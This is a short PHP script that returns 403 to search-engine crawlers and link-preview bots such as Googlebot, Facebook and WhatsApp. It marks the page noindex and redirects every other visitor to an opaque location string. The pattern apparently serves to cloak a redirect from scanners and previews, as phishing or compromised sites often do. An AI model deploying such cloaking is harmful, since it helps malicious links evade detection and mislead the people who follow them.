<?php
// List of user-agents associated with bots and crawlers
$blockedUserAgents = array(
    'Googlebot',
    'Googlebot-Mobile',
    'Googlebot-Image',
    'Googlebot-News',
    'Googlebot-Video',
    'Bingbot',
    'MSNbot',
    'Slurp',
    'DuckDuckBot',
    'Baiduspider',
    'YandexBot',
    'Sogou Spider',
    'Soso Spider',
    'Exabot',
    'MJ12bot',
    'AhrefsBot',
    'SemrushBot',
    'Yeti',
    'Twitterbot',
    'Facebook',
    'WhatsApp',
    'LinkedInBot',
    'Pinterestbot',
    'BingPreview',
    'Mediapartners-Google',
    'AdsBot-Google',
    'Google-Read-Aloud',
    'Yahoo! Slurp China',
    'YandexImages',
    'YandexVideo',
    'YandexNews',
    'YandexBlogs',
    'YandexWebmaster',
    'YandexMedia',
    'YandexDirect',
    'YandexMetrika',
    'YandexPagechecker',
    'YandexScreenshotBot',
    'BLEXBot',
    'Bingbot/2.0',
    'Baiduspider/2.0',
    'Sogou web spider/4.0',
    'Sosoimagespider',
    'Exabot/3.0',
    'MJ12bot/v1.4.8',
    'SemrushBot/7',
    'Twitterbot/1.0',
    'FacebookBot',
    'WhatsApp/0.3.4479 N',
    'LinkedInBot/2.0',
    'TelegramBot',
);

// Check if the user-agent matches a blocked user-agent
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
foreach ($blockedUserAgents as $blockedAgent) {
    if (stripos($userAgent, $blockedAgent) !== false) {
        // Block access for the detected bot/crawler
        http_response_code(403); // Set HTTP 403 Forbidden status
        exit;
    }
}

// Set the X-Robots-Tag header
@header('X-Robots-Tag: "none, noindex, nofollow, noarchive, nosnippet, noodp, notranslate, noimageindex"');

// Redirect to a new location
$redirectUrl = 'YHCCrzhL1yDTDDLp79rndMg6kGZgduhowf1s5WumwLfpsric4SiNRrLqBKiC9B2wcuYqN8t7ACZI2X0AM7tYLiAjl0gGHl0IU1hT';
header('Location: ' . $redirectUrl);
exit; // Make sure to exit after sending the header
?>
